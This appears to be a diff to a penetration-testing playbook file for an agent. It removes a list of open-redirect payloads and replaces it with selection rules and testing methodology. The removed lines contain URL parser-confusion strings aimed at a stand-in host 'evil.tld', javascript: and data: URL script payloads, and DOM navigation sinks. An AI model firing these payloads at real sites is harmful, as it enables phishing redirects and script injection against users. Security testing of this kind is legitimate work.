@@ -1,56 +1,26 @@
-# PAYLOADS — Open Redirect
+# Context payload lookup: open redirect
 
-> Moved from payloads/SKILL.md during the 2026-09-19 playbook split. Load on demand only.
+Canonical guide: [open_redirect.md](../../web-mode/SKILL_FILES/VULNERABILITIES/WEB/open_redirect.md).
 
-## 10. Open Redirect
+This entry point contains selection rules, not a second payload library. Load the
+canonical guide's experiment and payload sections; its controls, preconditions,
+source/version limits and interpretation travel with every example.
 
-```
-//evil.tld
-//evil.tld@allowed.com
-//evil.tld%2f@allowed.com
-//evil.tld%23.allowed.com
-//evil.tld%252f.allowed.com
-//evil.tld\\.allowed.com
-http://evil.tld
-https://evil.tld
-//\\evil.tld
-/\\evil.tld
-\\\\evil.tld
-\\/evil.tld
-\\/\\/evil.tld
-//evil.tld#allowed.com
-//evil.tld?allowed.com
-//evil.tld;allowed.com
-//evil%E3%80%82tld                     # CJK fullwidth period
-javascript:alert(1)                     # if redirect goes to <a href>
-javascript://%0aalert(1)
-javascript://allowed.com/%0aalert(1)
-data:text/html,<script>location='https://evil.tld'</script>
-//goo%2egl/test
-//ÉvIl.tld
-http://allowed.com.evil.tld
-http://allowed.com@evil.tld
-http://evil.tld#@allowed.com
-http://evil.tld?@allowed.com
-http:[email protected]
-http://allowed.com:80@evil.tld
-http://[email protected]:80
-//evil.tld/.allowed.com
-//evil.tld%2eallowed.com
-file:////evil.tld
-```
+## Select the experiment
 
-### SVG / DOM SINKS
-```
-<svg><a href="//evil.tld"><circle r=400 /></a></svg>
-```
-```
-location = userInput
-location.href = userInput
-location.replace(userInput)
-location.assign(userInput)
-window.open(userInput)
-document.location = userInput
-```
+- Contexts: Server Location / DOM navigation / validator-fetcher disagreement.
+- Record the final parsed destination and each decode. Userinfo precedes @; it is not the destination host. A javascript URL needs a compatible client sink and is not generic 3xx execution.
+- Name the input source, decoder/parser and expected security boundary first.
+- Discovery may use a cheap justified probe before any primitive is confirmed.
+- Choose a valid baseline, a minimally changed probe, and a matched negative control.
+- Substitute only owned actor/resource IDs and a unique `AUDIT_MARKER`.
+- Preserve the real parser bytes and any required URL/base64/JSON encoding.
+- Record a denied request as the tested observation; do not certify the whole class.
+- An observed source example is not a vendor-wide working payload or target proof.
 
----
+## Return to the owning methodology
+
+If no example fits the observed sink, reason from that sink or current primary
+research rather than loading unrelated variants. If the application rejects the
+probe, discriminate parsing, reachability, authorization and delivery failure
+before either expanding or closing the hypothesis.
